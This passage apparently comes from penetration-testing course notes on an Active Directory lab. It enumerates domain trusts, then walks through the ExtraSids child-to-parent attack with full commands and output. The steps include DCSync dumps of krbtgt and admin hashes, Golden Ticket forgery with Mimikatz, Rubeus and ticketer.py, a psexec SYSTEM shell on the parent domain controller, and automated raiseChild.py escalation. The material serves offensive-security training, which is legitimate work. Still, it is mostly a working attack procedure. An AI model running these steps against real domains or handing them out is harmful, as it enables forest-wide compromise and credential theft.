+ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
+SelectiveAuthentication : False
+SIDFilteringForestAware : False
+SIDFilteringQuarantined : False
+Source                  : DC=INLANEFREIGHT,DC=LOCAL
+Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
+TGTDelegation           : False
+TrustAttributes         : 32
+TrustType               : Uplevel
+UsesAESKeys             : False
+UsesRC4Encryption       : False
+
+Direction               : BiDirectional
+DisallowTransivity      : False
+DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
+ForestTransitive        : True
+IntraForest             : False
+Name                    : FREIGHTLOGISTICS.LOCAL
+ObjectClass             : trustedDomain
+ObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca
+SelectiveAuthentication : False
+SIDFilteringForestAware : False
+SIDFilteringQuarantined : False
+Source                  : DC=INLANEFREIGHT,DC=LOCAL
+Target                  : FREIGHTLOGISTICS.LOCAL
+TGTDelegation           : False
+TrustAttributes         : 8
+TrustType               : Uplevel
+UsesAESKeys             : False
+UsesRC4Encryption       : False
+```
+
+**Explanation:**
+- Especially useful when limited to built-in tools only.
+- The output shows two trusts from `INLANEFREIGHT.LOCAL`:
+  - `LOGISTICS.INLANEFREIGHT.LOCAL` — `IntraForest: True` confirms this is a **child domain** within the same forest; `ForestTransitive: False`.
+  - `FREIGHTLOGISTICS.LOCAL` — `ForestTransitive: True` confirms this is a **cross-forest trust / external trust**.
+- Both trusts are `BiDirectional` — users can authenticate back and forth across both. If we cannot authenticate across a trust, we cannot perform any enumeration or attacks across it.
+
+---
+
+### Checking for Existing Trusts using Get-DomainTrust
+
+```powershell
+PS C:\htb> Get-DomainTrust
+
+SourceName      : INLANEFREIGHT.LOCAL
+TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : WITHIN_FOREST
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 6:20:22 PM
+WhenChanged     : 2/26/2022 11:55:55 PM
+
+SourceName      : INLANEFREIGHT.LOCAL
+TargetName      : FREIGHTLOGISTICS.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FOREST_TRANSITIVE
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 8:07:09 PM
+WhenChanged     : 2/27/2022 12:02:39 AM
+```
+
+**Explanation:**
+- PowerView's `Get-DomainTrust` provides a cleaner, more readable output than `Get-ADTrust`.
+- `WITHIN_FOREST` = parent-child intra-forest trust; `FOREST_TRANSITIVE` = cross-forest trust.
+- Beneficial once a foothold is obtained and we plan to compromise the environment further.
+
+---
+
+### Using Get-DomainTrustMapping
+
+```powershell
+PS C:\htb> Get-DomainTrustMapping
+
+SourceName      : INLANEFREIGHT.LOCAL
+TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : WITHIN_FOREST
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 6:20:22 PM
+WhenChanged     : 2/26/2022 11:55:55 PM
+
+SourceName      : INLANEFREIGHT.LOCAL
+TargetName      : FREIGHTLOGISTICS.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FOREST_TRANSITIVE
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 8:07:09 PM
+WhenChanged     : 2/27/2022 12:02:39 AM
+
+SourceName      : FREIGHTLOGISTICS.LOCAL
+TargetName      : INLANEFREIGHT.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FOREST_TRANSITIVE
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 8:07:08 PM
+WhenChanged     : 2/27/2022 12:02:41 AM
+
+SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL
+TargetName      : INLANEFREIGHT.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : WITHIN_FOREST
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 6:20:22 PM
+WhenChanged     : 2/26/2022 11:55:55 PM
+```
+
+**Explanation:**
+- `Get-DomainTrustMapping` maps all trust relationships from **all discovered domains**, not just the current one.
+- Shows bidirectional trusts from both perspectives (A→B and B→A), giving a complete picture of the forest trust topology.
+- From here, we can begin enumeration across trusts — for example, checking users in the child domain:
+
+```powershell
+PS C:\htb> Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
+
+samaccountname
+--------------
+htb-student_adm
+Administrator
+Guest
+lab_adm
+krbtgt
+```
+
+---
+
+### Using netdom to Query Domain Trust
+
+```cmd
+C:\htb> netdom query /domain:inlanefreight.local trust
+
+Direction Trusted\Trusting domain                         Trust type
+========= =======================                         ==========
+
+<->       LOGISTICS.INLANEFREIGHT.LOCAL
+Direct
+ Not found
+
+<->       FREIGHTLOGISTICS.LOCAL
+Direct
+ Not found
+
+The command completed successfully.
+```
+
+### Using netdom to Query Domain Controllers
+
+```cmd
+C:\htb> netdom query /domain:inlanefreight.local dc
+
+List of domain controllers with accounts in the domain:
+
+ACADEMY-EA-DC01
+The command completed successfully.
+```
+
+### Using netdom to Query Workstations and Servers
+
+```cmd
+C:\htb> netdom query /domain:inlanefreight.local workstation
+
+List of workstations with accounts in the domain:
+
+ACADEMY-EA-MS01
+ACADEMY-EA-MX01      ( Workstation or Server )
+SQL01      ( Workstation or Server )
+ILF-XRG      ( Workstation or Server )
+MAINLON      ( Workstation or Server )
+CISERVER      ( Workstation or Server )
+INDEX-DEV-LON      ( Workstation or Server )
+...SNIP...
+
+The command completed successfully.
+```
+
+**Explanation:**
+- `netdom query` uses the built-in Windows `netdom` command-line tool — no additional tools needed.
+- `trust` lists all trust relationships; `dc` lists Domain Controllers; `workstation` lists workstations and servers registered in the domain.
+- Useful when restricted to only built-in Windows tools on a client system.
+
+---
+
+### Visualizing Trust Relationships in BloodHound
+
+Use the **Map Domain Trusts** pre-built query in BloodHound to visually confirm trust relationships. In our environment, this shows two bidirectional trusts — `INLANEFREIGHT.LOCAL` connected to both `LOGISTICS.INLANEFREIGHT.LOCAL` and `FREIGHTLOGISTICS.LOCAL`.
+
+---
+
+### Onwards
+
+In the following sections, we cover attacks against child→parent domain trusts and bidirectional forest trusts. Always check with the client to ensure any trusts uncovered during enumeration are **in scope** and within the **Rules of Engagement** before attacking across them.
+
+---
+
+# 26. Attacking Domain Trusts — Child → Parent (Windows)
+
+## 26.1 SID History Primer
+
+The `sidHistory` attribute is used in migration scenarios. When a user is migrated from one domain to another, a new account is created in the second domain and the original user's SID is added to the new account's `sidHistory` — ensuring continued access to resources in the original domain. SID history is intended to work across domains but can also work within the same domain. Using Mimikatz, an attacker can perform **SID history injection** — adding the SID of a privileged account (e.g., Domain Admin, Enterprise Admin) to the `sidHistory` of an account they control. When authenticating, all SIDs in `sidHistory` are added to the user's token, granting those privileges.
+
+---
+
+## 26.2 ExtraSids Attack — Overview and Requirements
+
+This attack allows compromise of a **parent domain** once the **child domain** has been compromised. Within the same AD forest, the `sidHistory` property is respected due to a lack of SID Filtering protection. SID Filtering is a protection that filters out authentication requests from another forest across a trust — but it does **not** apply within the same forest. By setting a child domain user's `sidHistory` to the Enterprise Admins SID (which only exists in the parent domain), they are treated as a member of that group — giving administrative access to the entire forest. We are creating a **Golden Ticket** from the compromised child domain to compromise the parent domain.
+
+**Data required:**
+1. **KRBTGT NT hash** for the child domain
+2. **SID of the child domain**
+3. **Name of a target user** (does not need to exist — can be fake)
+4. **FQDN of the child domain**
+5. **SID of the Enterprise Admins group** of the root domain
+
+---
+
+## 26.3 ExtraSids Attack with Mimikatz
+
+### Obtaining the KRBTGT Account's NT Hash using Mimikatz
+
+The **KRBTGT** account is the service account for the Key Distribution Center (KDC) in Active Directory. It is used to encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use its password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create TGT tickets usable to request TGS tickets for any service on any host in the domain — this is the **Golden Ticket attack**, a well-known persistence mechanism. The only way to invalidate a Golden Ticket is to **change the KRBTGT password twice** — which should always be done after an assessment where full domain compromise is reached.
+
+```powershell
+PS C:\htb> mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
+
+[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
+[DC] 'LOGISTICS\krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 11/1/2021 11:21:33 AM
+Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 9d765b482771505cbe97411065964d5f
+    ntlm- 0: 9d765b482771505cbe97411065964d5f
+    lm  - 0: 69df324191d4a80f0ed100c10f20561e
+```
+
+**Explanation:**
+- DCSync performed against the child domain's `krbtgt` account.
+- `Hash NTLM: 9d765b482771505cbe97411065964d5f` — this is the KRBTGT NT hash needed for the Golden Ticket.
+- The **Object Security ID** also reveals the child domain SID: `S-1-5-21-2806153819-209893948-922872689`.
+
+---
+
+### Using Get-DomainSID
+
+```powershell
+PS C:\htb> Get-DomainSID
+
+S-1-5-21-2806153819-209893948-922872689
+```
+
+**Explanation:**
+- Returns the SID for the current (child) domain — also visible in the Mimikatz DCSync output above.
+
+---
+
+### Obtaining Enterprise Admins Group's SID using Get-DomainGroup
+
+```powershell
+PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+
+distinguishedname                                       objectsid
+-----------------                                       ---------
+CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
+```
+
+**Explanation:**
+- Retrieves the SID of the Enterprise Admins group from the parent domain.
+- Could also use: `Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"`.
+- The full SID `S-1-5-21-3842939050-3880317879-2865463114-519` is used as the `/sids:` parameter in the Golden Ticket.
+
+**Collected data points:**
+- KRBTGT hash: `9d765b482771505cbe97411065964d5f`
+- Child domain SID: `S-1-5-21-2806153819-209893948-922872689`
+- Target user (fake): `hacker`
+- Child domain FQDN: `LOGISTICS.INLANEFREIGHT.LOCAL`
+- Enterprise Admins SID: `S-1-5-21-3842939050-3880317879-2865463114-519`
+
+---
+
+### Using ls to Confirm No Access (Before Attack)
+
+```powershell
+PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
+
+ls : Access is denied
+At line:1 char:1
++ ls \\academy-ea-dc01.inlanefreight.local\c$
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+```
+
+**Explanation:**
+- Confirms we currently have no access to the parent domain DC's filesystem — used as a baseline before the attack.
+
+---
+
+### Creating a Golden Ticket with Mimikatz
+
+```powershell
+PS C:\htb> mimikatz.exe
+
+mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+
+User      : hacker
+Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
+SID       : S-1-5-21-2806153819-209893948-922872689
+User Id   : 500
+Groups Id : *513 512 520 518 519
+Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
+ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
+Lifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
+```
+
+**Explanation:**
+- `kerberos::golden` creates a forged TGT (Golden Ticket).
+- `/user:hacker` — fake username embedded in the ticket (does not need to exist in AD).
+- `/domain:` — child domain FQDN.
+- `/sid:` — child domain SID.
+- `/krbtgt:` — child domain KRBTGT NT hash.
+- `/sids:` — **Enterprise Admins SID from the parent domain** — this is the critical parameter that grants access to the entire parent domain/forest.
+- `/ptt` — Pass-the-Ticket; injects the ticket directly into the current session.
+- The `Lifetime` is set 10 years into the future — the ticket won't expire normally.
+
+---
+
+### Confirming a Kerberos Ticket is in Memory Using klist
+
+```powershell
+PS C:\htb> klist
+
+Current LogonId is 0:0xf6462
+
+Cached Tickets: (1)
+
+#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
+        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
+        Start Time: 3/28/2022 19:59:50 (local)
+        End Time:   3/25/2032 19:59:50 (local)
+        Renew Time: 3/25/2032 19:59:50 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+```
+
+**Explanation:**
+- The forged TGT for the non-existent `hacker` user is now cached in memory with a 10-year validity.
+
+---
+
+### Listing the Entire C: Drive of the Parent Domain Controller
+
+```powershell
+PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
+
+ Volume in drive \\academy-ea-dc01.inlanefreight.local\c$ has no label.
+ Volume Serial Number is B8B3-0D72
+
+ Directory of \\academy-ea-dc01.inlanefreight.local\c$
+
+09/15/2018  12:19 AM    <DIR>          PerfLogs
+10/06/2021  01:50 PM    <DIR>          Program Files
+09/15/2018  02:06 AM    <DIR>          Program Files (x86)
+11/19/2021  12:17 PM    <DIR>          Shares
+10/06/2021  10:31 AM    <DIR>          Users
+03/21/2022  12:18 PM    <DIR>          Windows
+               0 File(s)              0 bytes
+               6 Dir(s)  18,080,178,176 bytes free
+```
+
+**Explanation:**
+- With the Golden Ticket in memory, we now have full access to the parent domain DC's filesystem — confirming successful cross-domain escalation.
+- From here, the parent domain can be compromised in multiple ways.
+
+---
+
+## 26.4 ExtraSids Attack with Rubeus
+
+### Using ls to Confirm No Access Before Running Rubeus
+
+```powershell
+PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
+
+ls : Access is denied
+...
+    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+```
+
+### Creating a Golden Ticket using Rubeus
+
+```powershell
+PS C:\htb> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+
+[*] Action: Build TGT
+
+[*] Building PAC
+[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
+[*] SID            : S-1-5-21-2806153819-209893948-922872689
+[*] UserId         : 500
+[*] Groups         : 520,512,513,519,518
+[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519
+[*] ServiceKey     : 9D765B482771505CBE97411065964D5F
+[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
+[*] KDCKey         : 9D765B482771505CBE97411065964D5F
+[*] Service        : krbtgt
+[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL
+
+[*] Generating EncTicketPart
+[*] Signing PAC
+[*] Encrypting EncTicketPart
+[*] Generating Ticket
+[*] Generated KERB-CRED
+[*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'
+
+[*] AuthTime       : 3/29/2022 10:06:41 AM
+[*] StartTime      : 3/29/2022 10:06:41 AM
+[*] EndTime        : 3/29/2022 8:06:41 PM
+[*] RenewTill      : 4/5/2022 10:06:41 AM
+
+[*] base64(ticket.kirbi): doIF0zCCBc+gAwIBBa...SNIP...
+
+[+] Ticket successfully imported!
+```
+
+**Explanation:**
+- `/rc4:` — NT hash of the child domain's KRBTGT account.
+- `/sids:` — Enterprise Admins SID from the parent domain (the critical escalation parameter).
+- `/ptt` — injects the ticket directly into memory.
+- The `ExtraSIDs` field in the output confirms the parent domain's Enterprise Admins SID was embedded.
+
+---
+
+### Confirming the Ticket is in Memory Using klist (Rubeus)
+
+```powershell
+PS C:\htb> klist
+
+Current LogonId is 0:0xf6495
+
+Cached Tickets: (1)
+
+#0> Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
+    Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
+    KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+    Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
+    Start Time: 3/29/2022 10:06:41 (local)
+    End Time:   3/29/2022 20:06:41 (local)
+    Renew Time: 4/5/2022 10:06:41 (local)
+    Session Key Type: RSADSI RC4-HMAC(NT)
+    Cache Flags: 0x1 -> PRIMARY
+    Kdc Called:
+```
+
+---
+
+### Performing a DCSync Attack Against the Parent Domain (lab_adm)
+
+```powershell
+PS C:\Tools\mimikatz\x64> .\mimikatz.exe
+
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
+
+[DC] 'INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
+[DC] 'INLANEFREIGHT\lab_adm' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : lab_adm
+
+** SAM ACCOUNT **
+
+SAM Username         : lab_adm
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 2/27/2022 10:53:21 PM
+Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
+Object Relative ID   : 1001
+
+Credentials:
+  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
+    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
+    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6
+    lm  - 0: 6053227db44e996fe16b107d9d1e95a0
+```
+
+**Explanation:**
+- With the Golden Ticket in memory granting Enterprise Admin rights in the parent domain, Mimikatz can DCSync against the parent DC.
+- Targeting `lab_adm` retrieves the Domain Admin's NTLM hash from the parent domain.
+
+When dealing with multiple domains where the target domain differs from the user's domain, specify `/domain:` explicitly:
+
+```powershell
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
+
+[DC] 'INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
+...
+Credentials:
+  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
+```
+
+**Explanation:**
+- `/domain:INLANEFREIGHT.LOCAL` explicitly directs Mimikatz to the parent domain controller when operating from a session context in the child domain.
+
+> **Next Steps:** Now that we've walked through child→parent domain compromise from a Windows attack host, the next section covers the same attack from a Linux attack host.
+
+---
+
+# 27. Attacking Domain Trusts — Child → Parent (Linux)
+
+The same ExtraSids attack can be performed from a Linux attack host using Impacket tools. The same five data points are required:
+1. KRBTGT NT hash for the child domain
+2. SID for the child domain
+3. Name of a target user (does not need to exist)
+4. FQDN of the child domain
+5. SID of the Enterprise Admins group of the root domain
+
+---
+
+## 27.1 Performing DCSync with secretsdump.py
+
+```bash
+$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
+krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
+krbtgt:des-cbc-md5:fee04c3d026d7538
+[*] Cleaning up...
+```
+
+**Explanation:**
+- Authenticates to the child domain DC (`172.16.5.240`) and DCsyncs only the `krbtgt` account.
+- `-just-dc-user LOGISTICS/krbtgt` limits the dump to one account.
+- NT hash: `9d765b482771505cbe97411065964d5f` — needed for `ticketer.py`.
+
+---
+
+## 27.2 Brute Forcing SIDs with lookupsid.py
+
+### Performing SID Brute Forcing using lookupsid.py
+
+```bash
+$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
+
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Brute forcing SIDs at 172.16.5.240
+[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
+500: LOGISTICS\Administrator (SidTypeUser)
+501: LOGISTICS\Guest (SidTypeUser)
+502: LOGISTICS\krbtgt (SidTypeUser)
+512: LOGISTICS\Domain Admins (SidTypeGroup)
+513: LOGISTICS\Domain Users (SidTypeGroup)
+514: LOGISTICS\Domain Guests (SidTypeGroup)
+515: LOGISTICS\Domain Computers (SidTypeGroup)
+516: LOGISTICS\Domain Controllers (SidTypeGroup)
+517: LOGISTICS\Cert Publishers (SidTypeAlias)
+520: LOGISTICS\Group Policy Creator Owners (SidTypeGroup)
+521: LOGISTICS\Read-only Domain Controllers (SidTypeGroup)
+522: LOGISTICS\Cloneable Domain Controllers (SidTypeGroup)
+525: LOGISTICS\Protected Users (SidTypeGroup)
+526: LOGISTICS\Key Admins (SidTypeGroup)
+553: LOGISTICS\RAS and IAS Servers (SidTypeAlias)
+571: LOGISTICS\Allowed RODC Password Replication Group (SidTypeAlias)
+572: LOGISTICS\Denied RODC Password Replication Group (SidTypeAlias)
+1001: LOGISTICS\lab_adm (SidTypeUser)
+1002: LOGISTICS\ACADEMY-EA-DC02$ (SidTypeUser)
+1103: LOGISTICS\DnsAdmins (SidTypeAlias)
+1104: LOGISTICS\DnsUpdateProxy (SidTypeGroup)
+1105: LOGISTICS\INLANEFREIGHT$ (SidTypeUser)
+1106: LOGISTICS\htb-student_adm (SidTypeUser)
+```
+
+**Explanation:**
+- `lookupsid.py` brute forces SID values at the target DC to enumerate all domain users, groups, and — critically — the **domain SID**.
+- The SID for `lab_adm` would be `S-1-5-21-2806153819-209893948-922872689-1001` (domain SID + RID).
+
+### Looking for the Domain SID (Filtered)
+
+```bash
+$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
+
+Password:
+[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
+```
+
+### Grabbing the Domain SID and Attaching to Enterprise Admin's RID
+
+```bash
+$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+
+Password:
+[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
+498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: INLANEFREIGHT\administrator (SidTypeUser)
+501: INLANEFREIGHT\guest (SidTypeUser)
+502: INLANEFREIGHT\krbtgt (SidTypeUser)
+512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
+513: INLANEFREIGHT\Domain Users (SidTypeGroup)
+514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
+515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
+516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
+517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
+518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
+519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
+```
+
+**Explanation:**
+- The second command targets the **parent domain DC** (`172.16.5.5`) to retrieve the parent domain SID and identify the Enterprise Admins group RID (`519`).
+- Full Enterprise Admins SID: `S-1-5-21-3842939050-3880317879-2865463114-519`.
+
+**Collected data points:**
+- KRBTGT hash: `9d765b482771505cbe97411065964d5f`
+- Child domain SID: `S-1-5-21-2806153819-209893948-922872689`
+- Target user (fake): `hacker`
+- Child FQDN: `LOGISTICS.INLANEFREIGHT.LOCAL`
+- Enterprise Admins SID: `S-1-5-21-3842939050-3880317879-2865463114-519`
+
+---
+
+## 27.3 Constructing a Golden Ticket using ticketer.py
+
+```bash
+$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncAsRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncASRepPart
+[*] Saving ticket in hacker.ccache
+```
+
+**Explanation:**
+- `ticketer.py` from Impacket creates a forged Golden Ticket saved as `hacker.ccache`.
+- `-nthash` — child domain KRBTGT NT hash.
+- `-domain` — child domain FQDN.
+- `-domain-sid` — child domain SID (valid in child domain).
+- `-extra-sid` — Enterprise Admins SID from parent domain (grants access to parent domain).
+- `hacker` — the username embedded in the ticket (does not need to exist).
+- The ticket is saved as a `.ccache` credential cache file.
+
+---
+
+## 27.4 Setting KRB5CCNAME and Getting a SYSTEM Shell via psexec.py
+
+```bash
+$ export KRB5CCNAME=hacker.ccache
+```
+
+**Explanation:**
+- Tells all Kerberos tools to use `hacker.ccache` for authentication.
+
+```bash
+$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 172.16.5.5.....
+[*] Found writable share ADMIN$
+[*] Uploading file nkYjGWDZ.exe
+[*] Opening SVCManager on 172.16.5.5.....
+[*] Creating service eTCU on 172.16.5.5.....
+[*] Starting service eTCU.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> hostname
+ACADEMY-EA-DC01
+```
+
+**Explanation:**
+- `-k -no-pass` uses the Kerberos ticket from `KRB5CCNAME` — no password required.
+- `-target-ip 172.16.5.5` specifies the parent DC's IP directly.
+- `whoami` confirms `nt authority\system` — full SYSTEM shell on the parent domain DC.
+- `hostname` confirms we are on `ACADEMY-EA-DC01` — the parent domain's DC.
+
+---
+
+## 27.5 Automated Attack with raiseChild.py
+
+```bash
+$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
+[*] Forest FQDN is: INLANEFREIGHT.LOCAL
+[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
+[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
+[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
+LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
+LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
+[*] Getting credentials for INLANEFREIGHT.LOCAL
+INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
+INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
+[*] Target User account name is administrator
+INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
+INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
+[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
